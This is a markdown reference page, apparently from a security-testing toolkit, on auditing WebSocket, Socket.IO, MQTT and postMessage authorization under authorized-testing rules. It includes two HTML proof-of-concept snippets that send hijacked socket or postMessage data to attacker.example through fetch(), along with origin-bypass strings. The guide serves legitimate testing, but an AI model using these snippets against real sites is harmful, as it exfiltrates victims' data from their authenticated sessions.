# WebSocket, Socket.IO, MQTT & postMessage

> Real-time channels often authenticate once at the handshake and then trust every message. postMessage
> often trusts `event.origin` incorrectly or not at all. Both turn client-side data into server-side or
> cross-origin authority.

Authorized targets only. Use two owned accounts/sessions; never subscribe broadly to real user traffic.

---

## 1. WebSocket attack surface

| Layer | Question |
|---|---|
| Handshake | Is auth required? Is `Origin` validated? Are cookies/tokens sent? |
| Token | Token in URL/query/subprotocol? Reusable? Expires? Bound to session? |
| Connection | Can an unauthenticated or cross-site page connect? |
| Messages | Is every event authorized for the principal/resource/context? |
| Broadcast | Does a room/topic leak messages to non-members? |
| Reconnect | After role/tenant change, is authority re-checked? |
| Close/idle | Does the token remain valid after logout? |

### Tests

1. Connect with no cookie/token → is the handshake accepted?
2. Connect from a different `Origin` (custom HTML page) → is it accepted?
3. Capture frames; replay with a **foreign** object/conversation/tenant ID.
4. Swap `userId`, `sessionId`, `roomId`, `tenantId`, `conversationId` in frames.
5. Subscribe/join a room/topic you should not access; see if you receive messages.
6. Change role/plan, then send a privileged event on the old connection.
7. Reconnect with an expired/logout token.
8. Test Socket.IO namespace/event authorization, not just the default namespace.
9. Test message size/type confusion and binary frames.
10. Test server-to-client events for extra fields (PII, internal IDs).

Tools: Burp WebSocket history, `websocat`, `wscat`, browser DevTools → Network → WS → Messages,
`mitmproxy` for binary frames.

### Cross-site WebSocket hijacking (CSWSH)

A WebSocket handshake is a normal HTTP GET with cookies. If the server does not validate `Origin`, a
malicious page can open a socket in the victim's authenticated context and read messages.

PoC shape:

```html
<script>
  const ws = new WebSocket('wss://target.com/ws');
  ws.onopen = () => ws.send(JSON.stringify({action:'get_profile'}));
  ws.onmessage = (e) => fetch('https://attacker.example/?d='+encodeURIComponent(e.data));
</script>
```

FP gate: browser blocks mixed content (wss from https is fine), `Origin` validated server-side, or the
socket requires a token the attacker cannot obtain.

---

## 2. Socket.IO specifics

- Handshake path `/socket.io/?EIO=4&transport=polling`; auth often in the `auth` payload or headers.
- Test namespaces (`/admin`, `/internal`) and events (`emit`/`on`) with a low-priv session.
- Polling transport may expose session IDs; check whether a leaked `sid` can be reused from another client.
- `join`/`leave` room handlers are a common authorization gap.
- Listen for server broadcasts that include other users' data.

---

## 3. MQTT over WebSocket

- Credentials often embedded in `env_app.js` / public config: `mqtt://`, `wss://`, username/password, clientId.
- Public config is a discovery signal, not a finding. Test authorization with two owned sessions.
- Topic authorization: can you subscribe to `#`, `+`, another tenant's topic, retained messages?
- Publish authorization: can you publish to a control topic or another user's topic?
- Clean session / will messages / retained messages can leak state.
- Do not collect real customer messages; prove session mixing between two controlled sessions.

---

## 4. postMessage

### Sinks and sources

Sources: `event.data`, `event.origin`, `event.source`.
Sinks: `innerHTML`, `eval`, `Function`, `document.write`, `location`, `postMessage(..., '*')`,
`window.open`, dynamic script/iframe creation, framework `dangerouslySetInnerHTML`.

### Tests

1. Does the listener validate `event.origin`? Try a page on a different origin sending a message.
2. Is the check a prefix/substring/regex (`startsWith('https://target.com')`, `/target\.com/`)?
   Try `https://target.com.evil.example`, `https://evil-target.com`, `null` origin (sandboxed iframe).
3. Does it call `postMessage(data, '*')`? A wildcard targetOrigin leaks data to any opener/iframe.
4. Does it trust `event.source` without checking the window?
5. Is `event.data` passed to a dangerous sink without validation?
6. Can a child iframe send a privileged command (state change) to the parent?
7. Does a message schema accept extra fields (prototype pollution, mass assignment)?
8. Cross-origin data exposure: can attacker page read victim data via a message reply?
9. `window.opener` / `target="_blank"` without `noopener` → reverse tabnabbing + message control.

PoC shape:

```html
<iframe src="https://target.com/app" id="f"></iframe>
<script>
  f.onload = () => f.contentWindow.postMessage(
    {type:'getUser', userId: VICTIM_ID}, '*');
  window.onmessage = (e) => fetch('https://attacker.example/?d='+encodeURIComponent(JSON.stringify(e.data)));
</script>
```

### FP gate

- Origin strictly validated (`=== 'https://target.com'`) and targetOrigin is explicit.
- Message only carries public data or is ignored by the receiver.
- Sink sanitizes HTML/URLs.
- The parent/child relationship cannot be established by an attacker page.

---

## 5. Evidence gate

- Two owned identities/sessions, canary object/message.
- Show the foreign message/data or the unauthorized state change, not just a connected socket.
- For postMessage, show the receiver acting on attacker-controlled data or leaking it cross-origin.
- Stop immediately if real user data appears.
- Record the exact frame/message, origin, and sequence so triage can replay it.

## 6. Related

- `skills/web2-vuln-classes/SKILL.md` §3 XSS (postMessage sinks) and §27 CSRF (WebSocket CSRF).
- `skills/agentic-app-audit/references/chat-support-and-widgets.md` (chat/WS/MQTT backend).
- `skills/web2-exposure/SKILL.md` when the leak is a transcript/history artifact.